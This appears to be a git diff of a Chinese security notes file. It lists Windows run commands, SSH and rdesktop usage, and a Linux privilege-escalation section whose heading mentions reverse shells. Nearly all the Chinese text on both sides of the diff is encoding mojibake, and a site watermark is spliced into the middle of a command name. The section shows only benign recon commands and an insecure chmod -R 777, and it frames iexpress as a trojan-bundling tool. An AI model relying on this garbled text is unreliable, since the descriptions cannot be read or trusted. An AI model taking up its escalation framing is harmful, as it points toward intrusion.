-¡¡¡¡dxdiag---------¼ì²éDirectXĞÅÏ¢
-¡¡¡¡drwtsn32------ ÏµÍ³Ò½Éú
-¡¡¡¡devmgmt.msc--- Éè±¸¹ÜÀíÆ÷
-¡¡¡¡dfrg.msc-------´ÅÅÌËéÆ¬ÕûÀí³ÌĞò
-¡¡¡¡diskmgmt.msc---´ÅÅÌ¹ÜÀíÊµÓÃ³ÌĞò
-¡¡¡¡dcomcnfg-------´ò¿ªÏµÍ³×é¼ş·şÎñ
-¡¡¡¡ddeshare-------´ò¿ªDDE¹²ÏíÉèÖÃ
-¡¡¡¡dvdplay--------DVD²¥·ÅÆ÷
-cmdÃüÁî´óÈ«£¨ÍøÂç¹ÜÀí£©
-¡¡¡¡net stop messenger-----Í£Ö¹ĞÅÊ¹·şÎñ
-¡¡¡¡net start messenger----¿ªÊ¼ĞÅÊ¹·şÎñ
-¡¡¡¡notepad--------´ò¿ª¼ÇÊÂ±¾
-¡¡¡¡nslookup-------ÍøÂç¹ÜÀíµÄ¹¤¾ßÏòµ¼
-¡¡¡¡ntbackup-------ÏµÍ³±¸·İºÍ»¹Ô­
-¡¡¡¡narrator-------ÆÁÄ»¡°½²ÊöÈË¡±
-¡¡¡¡ntmsmgr.msc----ÒÆ¶¯´æ´¢¹ÜÀíÆ÷
-¡¡¡¡ntmsoprq.msc---ÒÆ¶¯´æ´¢¹ÜÀíÔ±²Ù×÷ÇëÇó
-¡¡¡¡netstat -an----(TC)ÃüÁî¼ì²é½Ó¿Ú
-cmdÃüÁî´óÈ«£¨ÎÄ¼ş¹ÜÀí£©
-¡¡¡¡syncapp--------´´½¨Ò»¸ö¹«ÎÄ°ü
-¡¡¡¡sysedit--------ÏµÍ³ÅäÖÃ±à¼­Æ÷
-¡¡¡¡sigverif-------ÎÄ¼şÇ©ÃûÑéÖ¤³ÌĞò
-¡¡¡¡sndrec32-------Â¼Òô»ú
-¡¡¡¡shrpubw--------´´½¨¹²ÏíÎÄ¼ş¼Ğ
-¡¡¡¡secpol.m×ªÔØ×ÔµçÄÔÊ®Íò¸öÎªÊ²Ã´http://www.qq880.com£¬Çë±£Áô´Ë±ê¼Çsc-----±¾µØ°²È«²ßÂÔ
-¡¡¡¡syskey---------ÏµÍ³¼ÓÃÜ£¬Ò»µ©¼ÓÃÜ¾Í²»ÄÜ½â¿ª£¬±£»¤windows xpÏµÍ³µÄË«ÖØÃÜÂë
-¡¡¡¡services.msc---±¾µØ·şÎñÉèÖÃ
-¡¡¡¡Sndvol32-------ÒôÁ¿¿ØÖÆ³ÌĞò
-¡¡¡¡sfc.exe--------ÏµÍ³ÎÄ¼ş¼ì²éÆ÷
-¡¡¡¡sfc /scannow---windowsÎÄ¼ş±£»¤
-cmdÃüÁî´óÈ«£¨ÈÎÎñ¹ÜÀí£©
-¡¡¡¡tsshutdn-------60Ãëµ¹¼ÆÊ±¹Ø»úÃüÁî
-¡¡¡¡tourstart------xp¼ò½é£¨°²×°Íê³Éºó³öÏÖµÄÂşÓÎxp³ÌĞò£©
-¡¡¡¡taskmgr--------ÈÎÎñ¹ÜÀíÆ÷
-¡¡¡¡eventvwr-------ÊÂ¼ş²é¿´Æ÷
-¡¡¡¡eudcedit-------Ôì×Ö³ÌĞò
-¡¡¡¡explorer-------´ò¿ª×ÊÔ´¹ÜÀíÆ÷
-¡¡¡¡packager-------¶ÔÏó°ü×°³ÌĞò
-¡¡¡¡perfmon.msc----¼ÆËã»úĞÔÄÜ¼à²â³ÌĞò
-¡¡¡¡progman--------³ÌĞò¹ÜÀíÆ÷
-¡¡¡¡regedit.exe----×¢²á±í
-¡¡¡¡rsop.msc-------×é²ßÂÔ½á¹û¼¯
-¡¡¡¡regedt32-------×¢²á±í±à¼­Æ÷
-¡¡¡¡rononce -p ----15Ãë¹Ø»ú
-¡¡¡¡regsvr32 /u *.dll----Í£Ö¹dllÎÄ¼şÔËĞĞ
-¡¡¡¡regsvr32 /u zipfldr.dll------È¡ÏûZIPÖ§³Ö
-cmdÃüÁî´óÈ«£¨³ÌĞò¹ÜÀí£©
-¡¡¡¡cmd.exe--------CMDÃüÁîÌáÊ¾·û
-¡¡¡¡chkdsk.exe-----Chkdsk´ÅÅÌ¼ì²é
-¡¡¡¡certmgr.msc----Ö¤Êé¹ÜÀíÊµÓÃ³ÌĞò
-¡¡¡¡calc-----------Æô¶¯¼ÆËãÆ÷
-¡¡¡¡charmap--------Æô¶¯×Ö·ûÓ³Éä±í
-¡¡¡¡cliconfg-------SQL SERVER ¿Í»§¶ËÍøÂçÊµÓÃ³ÌĞò
-¡¡¡¡Clipbrd--------¼ôÌù°å²é¿´Æ÷
-¡¡¡¡conf-----------Æô¶¯netmeeting
-¡¡¡¡compmgmt.msc---¼ÆËã»ú¹ÜÀí
-¡¡¡¡cleanmgr-------À¬»øÕûÀí
-¡¡¡¡ciadv.msc------Ë÷Òı·şÎñ³ÌĞò
-¡¡¡¡osk------------´ò¿ªÆÁÄ»¼üÅÌ
-¡¡¡¡odbcad32-------ODBCÊı¾İÔ´¹ÜÀíÆ÷
-¡¡¡¡oobe/msoobe /a----¼ì²éXPÊÇ·ñ¼¤»î
-¡¡¡¡lusrmgr.msc----±¾»úÓÃ»§ºÍ×é
-¡¡¡¡logoff---------×¢ÏúÃüÁî
-¡¡¡¡iexpress-------Ä¾ÂíÀ¦°ó¹¤¾ß£¬ÏµÍ³×Ô´ø
-¡¡¡¡Nslookup-------IPµØÖ·Õì²âÆ÷
-¡¡¡¡fsmgmt.msc-----¹²ÏíÎÄ¼ş¼Ğ¹ÜÀíÆ÷
-¡¡¡¡utilman--------¸¨Öú¹¤¾ß¹ÜÀíÆ÷
-¡¡¡¡gpedit.msc-----×é²ßÂÔ
-	at------------²é¿´µ±Ç°ÈÎÎñ
+cmdå‘½ä»¤å¤§å…¨ï¼ˆç³»ç»Ÿä¿¡æ¯æœé›†ï¼‰
+ã€€ã€€winver---------æ£€æŸ¥Windowsç‰ˆæœ¬
+ã€€ã€€wmimgmt.msc----æ‰“å¼€windowsç®¡ç†ä½“ç³»ç»“æ„(WMI)
+ã€€ã€€wupdmgr--------windowsæ›´æ–°ç¨‹åº
+ã€€ã€€wscript--------windowsè„šæœ¬å®¿ä¸»è®¾ç½®
+ã€€ã€€write----------å†™å­—æ¿
+ã€€ã€€winmsd---------ç³»ç»Ÿä¿¡æ¯
+ã€€ã€€wiaacmgr-------æ‰«æä»ªå’Œç…§ç›¸æœºå‘å¯¼
+ã€€ã€€winchat--------XPè‡ªå¸¦å±€åŸŸç½‘èŠå¤©
+cmdå‘½ä»¤å¤§å…¨ï¼ˆç³»ç»ŸåŠŸèƒ½ï¼‰
+ã€€ã€€mem.exe--------æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µ
+ã€€ã€€Msconfig.exe---ç³»ç»Ÿé…ç½®å®ç”¨ç¨‹åº
+ã€€ã€€mplayer2-------ç®€æ˜“widnows media player
+ã€€ã€€mspaint--------ç”»å›¾æ¿
+ã€€ã€€mstsc----------è¿œç¨‹æ¡Œé¢è¿æ¥
+ã€€ã€€mplayer2-------åª’ä½“æ’­æ”¾æœº
+ã€€ã€€magnify--------æ”¾å¤§é•œå®ç”¨ç¨‹åº
+ã€€ã€€mmc------------æ‰“å¼€æ§åˆ¶å°
+ã€€ã€€mobsync--------åŒæ­¥å‘½ä»¤
+cmdå‘½ä»¤å¤§å…¨ï¼ˆè®¾å¤‡ç®¡ç†ï¼‰
+ã€€ã€€dxdiag---------æ£€æŸ¥DirectXä¿¡æ¯
+ã€€ã€€drwtsn32------ ç³»ç»ŸåŒ»ç”Ÿ
+ã€€ã€€devmgmt.msc--- è®¾å¤‡ç®¡ç†å™¨
+ã€€ã€€dfrg.msc-------ç£ç›˜ç¢ç‰‡æ•´ç†ç¨‹åº
+ã€€ã€€diskmgmt.msc---ç£ç›˜ç®¡ç†å®ç”¨ç¨‹åº
+ã€€ã€€dcomcnfg-------æ‰“å¼€ç³»ç»Ÿç»„ä»¶æœåŠ¡
+ã€€ã€€ddeshare-------æ‰“å¼€DDEå…±äº«è®¾ç½®
+ã€€ã€€dvdplay--------DVDæ’­æ”¾å™¨
+cmdå‘½ä»¤å¤§å…¨ï¼ˆç½‘ç»œç®¡ç†ï¼‰
+ã€€ã€€net stop messenger-----åœæ­¢ä¿¡ä½¿æœåŠ¡
+ã€€ã€€net start messenger----å¼€å§‹ä¿¡ä½¿æœåŠ¡
+ã€€ã€€notepad--------æ‰“å¼€è®°äº‹æœ¬
+ã€€ã€€nslookup-------ç½‘ç»œç®¡ç†çš„å·¥å…·å‘å¯¼
+ã€€ã€€ntbackup-------ç³»ç»Ÿå¤‡ä»½å’Œè¿˜åŸ
+ã€€ã€€narrator-------å±å¹•â€œè®²è¿°äººâ€
+ã€€ã€€ntmsmgr.msc----ç§»åŠ¨å­˜å‚¨ç®¡ç†å™¨
+ã€€ã€€ntmsoprq.msc---ç§»åŠ¨å­˜å‚¨ç®¡ç†å‘˜æ“ä½œè¯·æ±‚
+ã€€ã€€netstat -an----(TC)å‘½ä»¤æ£€æŸ¥æ¥å£
+cmdå‘½ä»¤å¤§å…¨ï¼ˆæ–‡ä»¶ç®¡ç†ï¼‰
+ã€€ã€€syncapp--------åˆ›å»ºä¸€ä¸ªå…¬æ–‡åŒ…
+ã€€ã€€sysedit--------ç³»ç»Ÿé…ç½®ç¼–è¾‘å™¨
+ã€€ã€€sigverif-------æ–‡ä»¶ç­¾åéªŒè¯ç¨‹åº
+ã€€ã€€sndrec32-------å½•éŸ³æœº
+ã€€ã€€shrpubw--------åˆ›å»ºå…±äº«æ–‡ä»¶å¤¹
+ã€€ã€€secpol.mè½¬è½½è‡ªç”µè„‘åä¸‡ä¸ªä¸ºä»€ä¹ˆhttp://www.qq880.comï¼Œè¯·ä¿ç•™æ­¤æ ‡è®°sc-----æœ¬åœ°å®‰å…¨ç­–ç•¥
+ã€€ã€€syskey---------ç³»ç»ŸåŠ å¯†ï¼Œä¸€æ—¦åŠ å¯†å°±ä¸èƒ½è§£å¼€ï¼Œä¿æŠ¤windows xpç³»ç»Ÿçš„åŒé‡å¯†ç 
+ã€€ã€€services.msc---æœ¬åœ°æœåŠ¡è®¾ç½®
+ã€€ã€€Sndvol32-------éŸ³é‡æ§åˆ¶ç¨‹åº
+ã€€ã€€sfc.exe--------ç³»ç»Ÿæ–‡ä»¶æ£€æŸ¥å™¨
+ã€€ã€€sfc /scannow---windowsæ–‡ä»¶ä¿æŠ¤
+cmdå‘½ä»¤å¤§å…¨ï¼ˆä»»åŠ¡ç®¡ç†ï¼‰
+ã€€ã€€tsshutdn-------60ç§’å€’è®¡æ—¶å…³æœºå‘½ä»¤
+ã€€ã€€tourstart------xpç®€ä»‹ï¼ˆå®‰è£…å®Œæˆåå‡ºç°çš„æ¼«æ¸¸xpç¨‹åºï¼‰
+ã€€ã€€taskmgr--------ä»»åŠ¡ç®¡ç†å™¨
+ã€€ã€€eventvwr-------äº‹ä»¶æŸ¥çœ‹å™¨
+ã€€ã€€eudcedit-------é€ å­—ç¨‹åº
+ã€€ã€€explorer-------æ‰“å¼€èµ„æºç®¡ç†å™¨
+ã€€ã€€packager-------å¯¹è±¡åŒ…è£…ç¨‹åº
+ã€€ã€€perfmon.msc----è®¡ç®—æœºæ€§èƒ½ç›‘æµ‹ç¨‹åº
+ã€€ã€€progman--------ç¨‹åºç®¡ç†å™¨
+ã€€ã€€regedit.exe----æ³¨å†Œè¡¨
+ã€€ã€€rsop.msc-------ç»„ç­–ç•¥ç»“æœé›†
+ã€€ã€€regedt32-------æ³¨å†Œè¡¨ç¼–è¾‘å™¨
+ã€€ã€€rononce -p ----15ç§’å…³æœº
+ã€€ã€€regsvr32 /u *.dll----åœæ­¢dllæ–‡ä»¶è¿è¡Œ
+ã€€ã€€regsvr32 /u zipfldr.dll------å–æ¶ˆZIPæ”¯æŒ
+cmdå‘½ä»¤å¤§å…¨ï¼ˆç¨‹åºç®¡ç†ï¼‰
+ã€€ã€€cmd.exe--------CMDå‘½ä»¤æç¤ºç¬¦
+ã€€ã€€chkdsk.exe-----Chkdskç£ç›˜æ£€æŸ¥
+ã€€ã€€certmgr.msc----è¯ä¹¦ç®¡ç†å®ç”¨ç¨‹åº
+ã€€ã€€calc-----------å¯åŠ¨è®¡ç®—å™¨
+ã€€ã€€charmap--------å¯åŠ¨å­—ç¬¦æ˜ å°„è¡¨
+ã€€ã€€cliconfg-------SQL SERVER å®¢æˆ·ç«¯ç½‘ç»œå®ç”¨ç¨‹åº
+ã€€ã€€Clipbrd--------å‰ªè´´æ¿æŸ¥çœ‹å™¨
+ã€€ã€€conf-----------å¯åŠ¨netmeeting
+ã€€ã€€compmgmt.msc---è®¡ç®—æœºç®¡ç†
+ã€€ã€€cleanmgr-------åƒåœ¾æ•´ç†
+ã€€ã€€ciadv.msc------ç´¢å¼•æœåŠ¡ç¨‹åº
+ã€€ã€€osk------------æ‰“å¼€å±å¹•é”®ç›˜
+ã€€ã€€odbcad32-------ODBCæ•°æ®æºç®¡ç†å™¨
+ã€€ã€€oobe/msoobe /a----æ£€æŸ¥XPæ˜¯å¦æ¿€æ´»
+ã€€ã€€lusrmgr.msc----æœ¬æœºç”¨æˆ·å’Œç»„
+ã€€ã€€logoff---------æ³¨é”€å‘½ä»¤
+ã€€ã€€iexpress-------æœ¨é©¬æ†ç»‘å·¥å…·ï¼Œç³»ç»Ÿè‡ªå¸¦
+ã€€ã€€Nslookup-------IPåœ°å€ä¾¦æµ‹å™¨
+ã€€ã€€fsmgmt.msc-----å…±äº«æ–‡ä»¶å¤¹ç®¡ç†å™¨
+ã€€ã€€utilman--------è¾…åŠ©å·¥å…·ç®¡ç†å™¨
+ã€€ã€€gpedit.msc-----ç»„ç­–ç•¥
+	at------------æŸ¥çœ‹å½“å‰ä»»åŠ¡
 }
 }
 }
 
 
 
-LinuxÌáÈ¨£¨exp·´µ¯shellÌáÈ¨£©
+Linuxææƒï¼ˆexpåå¼¹shellææƒï¼‰
 {
 {
-Ë¼Â·
-²Ù×÷
-LinuxÌáÈ¨³£ÓÃÃüÁî
+æ€è·¯
+æ“ä½œ
+Linuxææƒå¸¸ç”¨å‘½ä»¤
 id
 uname -a
 chmod -R 777 file
@@ -941,44 +941,44 @@ pwd
 tar
 
 
-sshÃüÁî
+sshå‘½ä»¤
 {
-1.sshÃüÁîÓÃÓÚÔ¶³ÌµÇÂ¼ÉÏLinuxÖ÷»ú¡£
-SSH£¨È«³Æ Secure Shell)ÊÇÒ»ÖÖ¼ÓÃÜµÄÍøÂçĞ­Òé¡£
-Ê¹ÓÃ¸ÃĞ­ÒéµÄÊı¾İ½«±»¼ÓÃÜ£¬Èç¹ûÔÚ´«ÊäÖĞ¼äÊı¾İĞ¹Â©£¬Ò²¿ÉÒÔÈ·±£Ã»ÓĞÈËÄÜ¶ÁÈ¡³öÓĞÓÃĞÅÏ¢¡£
-ÒªÊ¹ÓÃ SSH£¬Ä¿±ê»úÆ÷Ó¦¸Ã°²×° SSH ·şÎñ¶ËÓ¦ÓÃ³ÌĞò£¬ÒòÎª SSH ÊÇ»ùÓÚ¿Í»§-·şÎñÄ£Ê½µÄ¡£ 
-µ±ÄãÏë°²È«µÄÔ¶³ÌÁ¬½Óµ½Ö÷»ú£¬¿ÉÖĞ¼äµÄÍøÂç£¨±ÈÈçÒòÌØÍø£©²¢²»°²È«£¬Í¨³£ÕâÖÖÇé¿öÏÂ¾Í»áÊ¹ÓÃ SSH¡£
+1.sshå‘½ä»¤ç”¨äºè¿œç¨‹ç™»å½•ä¸ŠLinuxä¸»æœºã€‚
+SSHï¼ˆå…¨ç§° Secure Shell)æ˜¯ä¸€ç§åŠ å¯†çš„ç½‘ç»œåè®®ã€‚
+ä½¿ç”¨è¯¥åè®®çš„æ•°æ®å°†è¢«åŠ å¯†ï¼Œå¦‚æœåœ¨ä¼ è¾“ä¸­é—´æ•°æ®æ³„æ¼ï¼Œä¹Ÿå¯ä»¥ç¡®ä¿æ²¡æœ‰äººèƒ½è¯»å–å‡ºæœ‰ç”¨ä¿¡æ¯ã€‚
+è¦ä½¿ç”¨ SSHï¼Œç›®æ ‡æœºå™¨åº”è¯¥å®‰è£… SSH æœåŠ¡ç«¯åº”ç”¨ç¨‹åºï¼Œå› ä¸º SSH æ˜¯åŸºäºå®¢æˆ·-æœåŠ¡æ¨¡å¼çš„ã€‚ 
+å½“ä½ æƒ³å®‰å…¨çš„è¿œç¨‹è¿æ¥åˆ°ä¸»æœºï¼Œå¯ä¸­é—´çš„ç½‘ç»œï¼ˆæ¯”å¦‚å› ç‰¹ç½‘ï¼‰å¹¶ä¸å®‰å…¨ï¼Œé€šå¸¸è¿™ç§æƒ…å†µä¸‹å°±ä¼šä½¿ç”¨ SSHã€‚
 22
-1.°²×° SSH
+1.å®‰è£… SSH
 
-Èç¹ûÅöÇÉÄãµÄ»úÆ÷Ã»×°£¬ÎÒÃÇ¿ÉÒÔÊÖ¹¤À´°²×°Ò»ÏÂ¡£×î¼òµ¥µÄ·½Ê½¾ÍÊÇÊ¹ÓÃ Linux °ü¹ÜÀíÆ÷¡£
+å¦‚æœç¢°å·§ä½ çš„æœºå™¨æ²¡è£…ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹å·¥æ¥å®‰è£…ä¸€ä¸‹ã€‚æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨ Linux åŒ…ç®¡ç†å™¨ã€‚
 
-»ùÓÚ Debian / Ubuntu µÄÏµÍ³ :
-°²×° ssh-client
+åŸºäº Debian / Ubuntu çš„ç³»ç»Ÿ :
+å®‰è£… ssh-client
 $ sudo apt-get install openssh-client
-°²×° ssh-server
+å®‰è£… ssh-server
 $ sudo apt-get install openssh-server
 
-»ùÓÚ RedHat / CentOS µÄÏµÍ³ :
+åŸºäº RedHat / CentOS çš„ç³»ç»Ÿ :
 # yum install openssh-server openssh-clients
-SSH Ò»µ©°²×°ÉÏ£¬ÎÒÃÇ¾Í¿ÉÒÔÔÚÖÕ¶ËÏÂÊäÈë ssh À´¼ì²éÏÂ°²×°µÄÊÇ·ñÕı³£¡£
+SSH ä¸€æ—¦å®‰è£…ä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ç»ˆç«¯ä¸‹è¾“å…¥ ssh æ¥æ£€æŸ¥ä¸‹å®‰è£…çš„æ˜¯å¦æ­£å¸¸ã€‚
 
 
-2.³£ÓÃÃüÁî¸ñÊ½£ºssh [-l login_name] [-p port] [user@]hostname£¬¸üÏêÏ¸µÄ¿ÉÒÔÓÃssh -h²é¿´¡£
-¾ÙÀı
+2.å¸¸ç”¨å‘½ä»¤æ ¼å¼ï¼šssh [-l login_name] [-p port] [user@]hostnameï¼Œæ›´è¯¦ç»†çš„å¯ä»¥ç”¨ssh -hæŸ¥çœ‹ã€‚
+ä¸¾ä¾‹
 
-	²»Ö¸¶¨ÓÃ»§£º
+	ä¸æŒ‡å®šç”¨æˆ·ï¼š
 
 		ssh 192.168.0.11
 
-	Ö¸¶¨ÓÃ»§£º
+	æŒ‡å®šç”¨æˆ·ï¼š
 
 		ssh -l root 192.168.0.11
 
 		ssh root@192.168.0.11
 
 
-	Èç¹ûĞŞ¸Ä¹ısshµÇÂ¼¶Ë¿ÚµÄ¿ÉÒÔ£º
+	å¦‚æœä¿®æ”¹è¿‡sshç™»å½•ç«¯å£çš„å¯ä»¥ï¼š
 
 		ssh -p 12333 192.168.0.11
 
@@ -986,82 +986,82 @@ SSH Ò»µ©°²×°ÉÏ£¬ÎÒÃÇ¾Í¿ÉÒÔÔÚÖÕ¶ËÏÂÊäÈë ssh À´¼ì²éÏÂ°²×°µÄÊÇ·ñÕı³£¡£
 
 		ssh -p 12333 root@216.230.230.114
 
-4.ĞŞ¸ÄÅäÖÃÎÄ¼ş/etc/ssh/sshd_config£¬¿ÉÒÔ¸ÄsshµÇÂ¼¶Ë¿ÚºÍ½ûÖ¹rootµÇÂ¼¡£¸Ä¶Ë¿Ú¿ÉÒÔ·ÀÖ¹±»¶Ë¿ÚÉ¨Ãè¡£
+4.ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/ssh/sshd_configï¼Œå¯ä»¥æ”¹sshç™»å½•ç«¯å£å’Œç¦æ­¢rootç™»å½•ã€‚æ”¹ç«¯å£å¯ä»¥é˜²æ­¢è¢«ç«¯å£æ‰«æã€‚
 
-	±à¼­ÅäÖÃÎÄ¼ş£º
+	ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š
 
 		vim /etc/ssh/sshd_config
 
-	ÕÒµ½#Port 22£¬È¥µô×¢ÊÍ£¬ĞŞ¸Ä³ÉÒ»¸öÎåÎ»µÄ¶Ë¿Ú£º
+	æ‰¾åˆ°#Port 22ï¼Œå»æ‰æ³¨é‡Šï¼Œä¿®æ”¹æˆä¸€ä¸ªäº”ä½çš„ç«¯å£ï¼š
 
 		Port 12333
 
-	ÕÒµ½#PermitRootLogin yes£¬È¥µô×¢ÊÍ£¬ĞŞ¸ÄÎª£º
+	æ‰¾åˆ°#PermitRootLogin yesï¼Œå»æ‰æ³¨é‡Šï¼Œä¿®æ”¹ä¸ºï¼š
 
 		PermitRootLogin no
 
-	ÖØÆôsshd·şÎñ£º
+	é‡å¯sshdæœåŠ¡ï¼š
 
 		service sshd restart
 		
-5.SSH³£ÓÃ²ÎÊıÑ¡Ïî:
+5.SSHå¸¸ç”¨å‚æ•°é€‰é¡¹:
 {
-	-1£ºÇ¿ÖÆÊ¹ÓÃsshĞ­Òé°æ±¾1£» 
-	-2£ºÇ¿ÖÆÊ¹ÓÃsshĞ­Òé°æ±¾2£» 
-	-4£ºÇ¿ÖÆÊ¹ÓÃIPv4µØÖ·£» 
-	-6£ºÇ¿ÖÆÊ¹ÓÃIPv6µØÖ·£» 
-	-A£º¿ªÆôÈÏÖ¤´úÀíÁ¬½Ó×ª·¢¹¦ÄÜ£» 
-	-a£º¹Ø±ÕÈÏÖ¤´úÀíÁ¬½Ó×ª·¢¹¦ÄÜ£» 
-	-b£ºÊ¹ÓÃ±¾»úÖ¸¶¨µØÖ·×÷Îª¶ÔÓ¦Á¬½ÓµÄÔ´ipµØÖ·£» 
-	-C£ºÇëÇóÑ¹ËõËùÓĞÊı¾İ£» 
-	-F£ºÖ¸¶¨sshÖ¸ÁîµÄÅäÖÃÎÄ¼ş£» 
-	-f£ººóÌ¨Ö´ĞĞsshÖ¸Áî£» 
-	-g£ºÔÊĞíÔ¶³ÌÖ÷»úÁ¬½ÓÖ÷»úµÄ×ª·¢¶Ë¿Ú£» 
-	-i£ºÖ¸¶¨Éí·İÎÄ¼ş£» 
-	-l£ºÖ¸¶¨Á¬½ÓÔ¶³Ì·şÎñÆ÷µÇÂ¼ÓÃ»§Ãû£» 
-	-N£º²»Ö´ĞĞÔ¶³ÌÖ¸Áî£» 
-	-o£ºÖ¸¶¨ÅäÖÃÑ¡Ïî£» 
-	-p£ºÖ¸¶¨Ô¶³Ì·şÎñÆ÷ÉÏµÄ¶Ë¿Ú£» 
-	-q£º¾²Ä¬Ä£Ê½£» 
-	-X£º¿ªÆôX11×ª·¢¹¦ÄÜ£» 
-	-x£º¹Ø±ÕX11×ª·¢¹¦ÄÜ£» 
-	-y£º¿ªÆôĞÅÈÎX11×ª·¢¹¦ÄÜ¡£
+	-1ï¼šå¼ºåˆ¶ä½¿ç”¨sshåè®®ç‰ˆæœ¬1ï¼› 
+	-2ï¼šå¼ºåˆ¶ä½¿ç”¨sshåè®®ç‰ˆæœ¬2ï¼› 
+	-4ï¼šå¼ºåˆ¶ä½¿ç”¨IPv4åœ°å€ï¼› 
+	-6ï¼šå¼ºåˆ¶ä½¿ç”¨IPv6åœ°å€ï¼› 
+	-Aï¼šå¼€å¯è®¤è¯ä»£ç†è¿æ¥è½¬å‘åŠŸèƒ½ï¼› 
+	-aï¼šå…³é—­è®¤è¯ä»£ç†è¿æ¥è½¬å‘åŠŸèƒ½ï¼› 
+	-bï¼šä½¿ç”¨æœ¬æœºæŒ‡å®šåœ°å€ä½œä¸ºå¯¹åº”è¿æ¥çš„æºipåœ°å€ï¼› 
+	-Cï¼šè¯·æ±‚å‹ç¼©æ‰€æœ‰æ•°æ®ï¼› 
+	-Fï¼šæŒ‡å®šsshæŒ‡ä»¤çš„é…ç½®æ–‡ä»¶ï¼› 
+	-fï¼šåå°æ‰§è¡ŒsshæŒ‡ä»¤ï¼› 
+	-gï¼šå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥ä¸»æœºçš„è½¬å‘ç«¯å£ï¼› 
+	-iï¼šæŒ‡å®šèº«ä»½æ–‡ä»¶ï¼› 
+	-lï¼šæŒ‡å®šè¿æ¥è¿œç¨‹æœåŠ¡å™¨ç™»å½•ç”¨æˆ·åï¼› 
+	-Nï¼šä¸æ‰§è¡Œè¿œç¨‹æŒ‡ä»¤ï¼› 
+	-oï¼šæŒ‡å®šé…ç½®é€‰é¡¹ï¼› 
+	-pï¼šæŒ‡å®šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ç«¯å£ï¼› 
+	-qï¼šé™é»˜æ¨¡å¼ï¼› 
+	-Xï¼šå¼€å¯X11è½¬å‘åŠŸèƒ½ï¼› 
+	-xï¼šå…³é—­X11è½¬å‘åŠŸèƒ½ï¼› 
+	-yï¼šå¼€å¯ä¿¡ä»»X11è½¬å‘åŠŸèƒ½ã€‚
 }
 
 }
 }
 
-linuxÁ¬½ÓÔ¶³Ì×ÀÃæ
+linuxè¿æ¥è¿œç¨‹æ¡Œé¢
 {
 	sudo apt-get install xrdp
 	telnet 192.168.1.123
 	rdesktop -u username -p password  IP  -r sound:on/off -g 1024*768
-	ËµÃ÷£º
-		1¡¢usernameºÍpassword·Ö±ğÊÇÄ¿±êµçÄÔµÄÕÊºÅºÍÃÜÂë£»
+	è¯´æ˜ï¼š
+		1ã€usernameå’Œpasswordåˆ†åˆ«æ˜¯ç›®æ ‡ç”µè„‘çš„å¸å·å’Œå¯†ç ï¼›
 
-		2¡¢IPÎªÄ¿±êµçÄÔµÄIPµØÖ·£¨¿ÉÄÜĞèÒªÏÈÁ¬½ÓVPN£©£»
+		2ã€IPä¸ºç›®æ ‡ç”µè„‘çš„IPåœ°å€ï¼ˆå¯èƒ½éœ€è¦å…ˆè¿æ¥VPNï¼‰ï¼›
 
-		3¡¢sound£ºon±íÊ¾´«ËÍÄ¿±êµçÄÔµÄÉùÒô£¬offÔòÎª¹Ø±Õ£»
+		3ã€soundï¼šonè¡¨ç¤ºä¼ é€ç›®æ ‡ç”µè„‘çš„å£°éŸ³ï¼Œoffåˆ™ä¸ºå…³é—­ï¼›
 
-		4¡¢-gºó½ÓÏëÒªÏÔÊ¾µÄ·Ö±æÂÊ£¬Ê¹ÓÃ -g workarea ¿É×ÔÊÊÓ¦ÆÌÂúµ±Ç°linux´°¿Ú´óĞ¡
+		4ã€-gåæ¥æƒ³è¦æ˜¾ç¤ºçš„åˆ†è¾¨ç‡ï¼Œä½¿ç”¨ -g workarea å¯è‡ªé€‚åº”é“ºæ»¡å½“å‰linuxçª—å£å¤§å°
 
-		ÒÔÉÏ£¬³ıÁËÓÃ»§Ãû¡¢ÃÜÂëºÍIP±ØĞëÊäÈë£¬ÆäËû²ÎÊı¶¼¿ÉÒÔÈ±Ê¡¡£
+		ä»¥ä¸Šï¼Œé™¤äº†ç”¨æˆ·åã€å¯†ç å’ŒIPå¿…é¡»è¾“å…¥ï¼Œå…¶ä»–å‚æ•°éƒ½å¯ä»¥ç¼ºçœã€‚
 
-		¸ü¶à²ÎÊı£º
+		æ›´å¤šå‚æ•°ï¼š
 
-		5¡¢Ê¹ÓÃ -f ²ÎÊı½øÈëÈ«ÆÁÄ£Ê½£¬ÖĞÍ¾¿ÉÊ¹ÓÃCtrl+Alt+Enter×éºÏ¼üÍË³öÈ«ÆÁ£¨²»ÖªµÀµÄ¾ÍÓôÃÆÁË£©;
+		5ã€ä½¿ç”¨ -f å‚æ•°è¿›å…¥å…¨å±æ¨¡å¼ï¼Œä¸­é€”å¯ä½¿ç”¨Ctrl+Alt+Enterç»„åˆé”®é€€å‡ºå…¨å±ï¼ˆä¸çŸ¥é“çš„å°±éƒé—·äº†ï¼‰;
 
-		6¡¢-r disk:share_name=/local-disk ½«±¾µØ´ÅÅÌÓ³Éäµ½Ô¶³ÌµçÄÔ£¬ÆäÖĞshare_nameÎªÏÔÊ¾Ãû³Æ£¬¿É×Ô¶¨Òå£¬local-disk±íÊ¾±¾µØlinuxµÄÒ»¸öÄ¿Â¼£¬±ÈÈç /data¡£
-		7¡¢-r clipboard:PRIMARYCLIPBOARD ÔÊĞíÔÚÔ¶³ÌÖ÷»úºÍ±¾»úÖ®¼ä¹²Ïí¼ôÇĞ°å£¬¾ÍÊÇ¿ÉÒÔ¸´ÖÆÕ³Ìù¡£
-		ÒÔÉÏÊÇrdesktopµÄ³£ÓÃ²ÎÊı£¬¸ü¶à²ÎÊıÇë×ÔĞĞ°Ù¶È»òÕßÔÚlinuxÖĞÖ´ĞĞ rdesktop --help²é¿´¡£
+		6ã€-r disk:share_name=/local-disk å°†æœ¬åœ°ç£ç›˜æ˜ å°„åˆ°è¿œç¨‹ç”µè„‘ï¼Œå…¶ä¸­share_nameä¸ºæ˜¾ç¤ºåç§°ï¼Œå¯è‡ªå®šä¹‰ï¼Œlocal-diskè¡¨ç¤ºæœ¬åœ°linuxçš„ä¸€ä¸ªç›®å½•ï¼Œæ¯”å¦‚ /dataã€‚
